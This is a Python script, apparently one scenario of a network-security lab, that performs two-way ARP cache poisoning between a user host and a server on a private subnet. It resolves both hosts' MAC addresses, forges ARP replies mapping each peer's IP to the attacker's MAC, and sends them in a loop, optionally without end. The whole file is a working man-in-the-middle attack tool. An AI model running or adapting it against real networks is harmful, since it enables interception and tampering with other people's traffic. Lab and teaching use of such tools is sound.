#!/usr/bin/env python3
import argparse
import time

from arp import build_arp, iface_info, mac_to_str, open_arp_socket, resolve_mac


def main():
    parser = argparse.ArgumentParser(description="Kịch bản 2: poison ARP hai chiều")
    parser.add_argument("--iface", default="eth0")
    parser.add_argument("--user", default="10.11.1.10")
    parser.add_argument("--server", default="10.11.1.20")
    parser.add_argument("--count", type=int, default=30, help="0 = gửi liên tục")
    parser.add_argument("--interval", type=float, default=1.0)
    args = parser.parse_args()

    ip, mac = iface_info(args.iface)
    print("[*] Attacker: %s  MAC %s" % (ip, mac_to_str(mac)))
    user_mac = resolve_mac(args.iface, args.user)
    server_mac = resolve_mac(args.iface, args.server)
    print("[*] User:   %s  MAC %s" % (args.user, mac_to_str(user_mac)))
    print("[*] Server: %s  MAC %s" % (args.server, mac_to_str(server_mac)))

    to_user = build_arp(2, mac, args.server, user_mac, args.user)
    to_server = build_arp(2, mac, args.user, server_mac, args.server)
    sock = open_arp_socket(args.iface)
    sent = 0
    try:
        while args.count <= 0 or sent < args.count:
            sock.send(to_user)
            sock.send(to_server)
            sent += 1
            print("[+] Poison #%d: %s -> User, %s -> Server" % (sent, args.server, args.user))
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("[*] Dừng poison")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
